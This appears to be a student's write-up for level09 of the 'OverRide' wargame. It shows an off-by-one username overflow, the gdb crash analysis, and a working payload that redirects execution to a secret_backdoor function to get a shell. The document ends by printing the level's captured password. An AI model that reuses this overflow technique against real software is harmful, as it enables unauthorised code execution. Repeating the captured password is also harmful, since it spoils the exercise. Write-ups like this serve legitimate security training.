# Overflow input

we have a programme that need to receive a username and message. The username have 40 length but boucle on 41. So we can overflow the username.

```bash
level09@OverRide:~$ ./level09 <<<$(python -c 'print "B"*40+"\xff"')
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�>: Msg @Unix-Dude
>>: >: Msg sent!
Segmentation fault (core dumped)
```

to get more info on segfault we will download the executable and use gdb-peda to get more info on the segfault.

```bash
gdb-peda$ r <<<$(python -c 'print "B"*40+"\xff"+"\n"+"aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"')
Starting program: /home/alesio/Documents/42/override/exe/level09 <<<$(python -c 'print "B"*40+"\xff"+"\n"+"aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"')
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0xd ('\r')
RBX: 0x555555554ad0 (<__libc_csu_init>:	mov    QWORD PTR [rsp-0x28],rbp)
RCX: 0x7ffff7ecd057 (<__GI___libc_write+23>:	cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x5555557572a0 (">>: >: Msg sent!\n", 'B' <repeats 39 times>, "\377>: Msg @Unix-Dude\n")
RDI: 0x7ffff7faa4c0 --> 0x0 
RBP: 0x5858585857575757 ('WWWWXXXX')
RSP: 0x7fffffffded8 ("YYYYZZZZ\n")
RIP: 0x555555554931 (<handle_msg+113>:	ret)
R8 : 0xd ('\r')
R9 : 0x0 
R10: 0xfffffffffffff27f 
R11: 0x246 
R12: 0x555555554790 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdfd0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554924 <handle_msg+100>:	
    lea    rdi,[rip+0x295]        # 0x555555554bc0
   0x55555555492b <handle_msg+107>:	call   0x555555554730 <puts@plt>
   0x555555554930 <handle_msg+112>:	leave  
=> 0x555555554931 <handle_msg+113>:	ret    
   0x555555554932 <set_msg>:	push   rbp
   0x555555554933 <set_msg+1>:	mov    rbp,rsp
   0x555555554936 <set_msg+4>:	sub    rsp,0x410
   0x55555555493d <set_msg+11>:	mov    QWORD PTR [rbp-0x408],rdi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffded8 ("YYYYZZZZ\n")
0008| 0x7fffffffdee0 --> 0xa ('\n')
0016| 0x7fffffffdee8 --> 0x0 
0024| 0x7fffffffdef0 --> 0x0 
0032| 0x7fffffffdef8 --> 0x0 
0040| 0x7fffffffdf00 --> 0x0 
0048| 0x7fffffffdf08 --> 0x0 
0056| 0x7fffffffdf10 --> 0x555555554ad0 (<__libc_csu_init>:	mov    QWORD PTR [rsp-0x28],rbp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000555555554931 in handle_msg ()
```

we can see the RSP at 0x7fffffffded8 with string "YYYYZZZZ\n". let's try to get the offset with the script get_offset.py

```bash
➜  Ressources git:(level09) ✗ python3 get_offset.py W
offset -> 200
```

we can found in the code a function named secret_backdoor

```bash
(gdb) info func 
All defined functions:

Non-debugging symbols:
0x00005555555546f0  _init
0x0000555555554720  strncpy
0x0000555555554720  strncpy@plt
0x0000555555554730  puts
0x0000555555554730  puts@plt
0x0000555555554740  system
0x0000555555554740  system@plt
0x0000555555554750  printf
0x0000555555554750  printf@plt
0x0000555555554760  __libc_start_main
0x0000555555554760  __libc_start_main@plt
0x0000555555554770  fgets
0x0000555555554770  fgets@plt
0x0000555555554780  __cxa_finalize
0x0000555555554780  __cxa_finalize@plt
0x0000555555554790  _start
0x00005555555547bc  call_gmon_start
0x00005555555547e0  __do_global_dtors_aux
0x0000555555554860  frame_dummy
0x000055555555488c  secret_backdoor
0x00005555555548c0  handle_msg
0x0000555555554932  set_msg
---Type <return> to continue, or q <return> to quit---^CQuit
```

we can see the first letter of RSP on the segfault is at the position 200. so let's see the structure of our exploit

`overflow_username + max_char_to_be_sur_overflow + change_input + overflow offset of segfault on RSP + function_exploited + change_input + path_shell + execute_input_in_function`


`python -c 'print "B"*40+"\xff"+"\n"+"B"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00"+"\n"+"/bin/sh"+"\n"'`


```bash
level09@OverRide:~$ (python -c 'print "B"*40+"\xff"+"\n"+"B"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00"+"\n"+"/bin/sh\n"'; cat) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
^C
Segmentation fault (core dumped)
```
